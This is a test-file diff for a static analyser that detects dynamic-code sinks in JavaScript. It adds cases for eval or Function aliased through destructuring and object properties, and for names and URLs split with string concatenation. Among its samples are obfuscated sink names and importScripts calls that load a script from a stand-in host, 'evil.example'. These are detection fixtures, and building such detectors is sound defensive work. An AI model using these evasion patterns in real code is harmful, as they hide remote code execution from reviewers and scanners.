@@ -428,6 +428,85 @@ describe('aliased sinks', () => {
     // of them can create an alias.
     expect(fires("if (f === Function) { f('x') }")).toBe(false);
   });
+
+  // Round 16: two more BINDING FORMS. Both are the same act as `const F =
+  // Function` — giving a sink a second name — so they resolve through the same
+  // alias table rather than through a second mechanism. An object literal
+  // holding sinks makes the object a RECEIVER, which is exactly the
+  // relationship `globalThis`/`window`/`self` already had.
+  it.each([
+    ['destructured eval', 'const { eval: run } = globalThis; run(payload)'],
+    ['destructured Function', "const { Function: F } = window; F('return 1')()"],
+    ['destructured timer', "const { setTimeout: t } = self; t('evil()', 0)"],
+    ['an alias of a destructured sink', "const { eval: r } = globalThis; const q = r; q('x')"],
+    ['a sink held in an object property', "const o = { run: eval }; o.run('x')"],
+    ['the constructor held in an object property', "const o = { F: Function }; o.F('x')()"],
+    ['a computed property key', "const o = { ['ev' + 'al']: eval }; o['eval']('x')"],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['an unrelated destructured name', 'const { fetch: f } = globalThis; f(url)'],
+    ['an unrelated object property', "const o = { run: handler }; o.run('x')"],
+    ['a different property of a sink-holding object', "const o = { run: eval }; o.other('x')"],
+    // A spread, a method and a nested pattern are skipped whole rather than
+    // mis-paired with the entries after them.
+    ['a spread before the entries', "const o = { ...base, run: handler }; o.run('x')"],
+    ['a method before the entries', "const o = { m() { return 1; }, run: handler }; o.run('x')"],
+    ['a nested destructuring pattern', 'const { a: { b } } = cfg; b(x)'],
+  ])('does not flag %s', (_label, code) => {
+    expect(fires(code)).toBe(false);
+  });
+});
+
+describe('constant string folding', () => {
+  // Round 16. Every string predicate used to read only the FIRST token of an
+  // argument, which made `+` a universal bypass: the pieces of a URL or a
+  // property name written apart evaluate to exactly the same value as written
+  // together, so it is a SPELLING. Folding happens once and every predicate —
+  // remote-URL, string-timer, computed member access — shares it.
+  const remote = (code: string): boolean =>
+    findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK]).length > 0;
+
+  it.each([
+    "importScripts('ht' + 'tps://evil.example/x.js')",
+    'importScripts(`ht` + `tps://evil.example/x.js`)',
+    "importScripts(('ht' + 'tps:') + '//evil.example/x.js')",
+    "importScripts('//' + 'evil.example/x.js')",
+    "importScripts('https://evil.example/' + name + '.js')",
+  ])('catches a composed remote URL: %s', (code) => {
+    expect(remote(code)).toBe(true);
+  });
+
+  it.each([
+    "importScripts('sw' + '-push.js')",
+    "importScripts('/assets/' + name + '.js')",
+    "importScripts(origin + '/x.js')",
+  ])('does not flag a composed same-origin URL: %s', (code) => {
+    expect(remote(code)).toBe(false);
+  });
+
+  it.each([
+    ['a composed sink name', "globalThis['ev' + 'al']('x')"],
+    ['a composed method name', "Function['ca' + 'll'](null, 'return 42')()"],
+    ['a composed constructor name', "(()=>{})['const' + 'ructor']('return 42')()"],
+    // `+` yields a string whenever EITHER operand is one, so the timer body is
+    // a string even though it does not begin with a literal.
+    ['a composed timer body', "setTimeout(prefix + 'evil()', 0)"],
+    ['a trailing composed timer body', "setInterval('evil(' + arg + ')', 10)"],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['a numeric addition as a timer delay', 'setTimeout(handler, delay + 1)'],
+    ['a numeric first argument', 'setTimeout(delay + 1, 0)'],
+    ['an indexed handler lookup', "setTimeout(handlers['x'], 0)"],
+    ['an arrow body containing a string', "setTimeout(() => f('str'), 0)"],
+  ])('does not flag %s', (_label, code) => {
+    expect(fires(code)).toBe(false);
+  });
 });
 
 describe('the assembled sink sets', () => {
